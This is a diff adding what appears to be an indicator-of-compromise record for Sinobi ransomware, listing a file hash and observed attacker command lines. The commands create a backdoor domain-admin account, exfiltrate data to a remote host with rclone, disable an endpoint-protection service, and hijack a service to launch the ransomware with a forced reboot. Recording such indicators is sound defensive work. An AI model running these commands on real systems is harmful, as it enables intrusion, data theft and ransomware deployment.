@@ -1,0 +1,11 @@
+File:
+
+1b2a1e41a7f65b8d9008aa631f113cef36577e912c13f223ba8834bbefa4bd14 - Sinobi Ransomware (bin.exe)
+
+Command Line:
+
+cmd /c net user Assistance <REDACTED_PASSWORD> /add
+cmd /c net localgroup "domain admins" Assistance /add
+rclone.exe --config=c:\programdata\rclone-ssh.conf copy <REDACTED_SRC_PATH> remote:<REDACTED_DEST_PATH> --max-age=2y
+sc config cbdefense start= disabled
+cmd /c sc config cfdefense binpath= “C:\programdata\bin.exe” & shutdown /r /t 0
